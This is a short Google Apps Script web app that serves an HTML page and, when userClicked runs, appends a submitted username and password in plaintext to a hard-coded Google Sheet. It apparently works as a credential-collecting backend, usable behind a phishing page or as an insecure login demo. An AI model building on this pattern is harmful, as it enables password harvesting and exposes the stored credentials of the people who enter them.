function doGet(e){

  Logger.log(e);
  return HtmlService.createHtmlOutputFromFile("page");
}

function userClicked(username, password){
  var url = "https://docs.google.com/spreadsheets/d/16LpaaV4dFf6kiMjzpXen2YyMHXoQ85-Pm-ZBouVjH4M/edit#gid=0"
  var ss = SpreadsheetApp.openByUrl(url)
  var ws = ss.getSheetByName("Data");
  ws.appendRow([username, password])
}
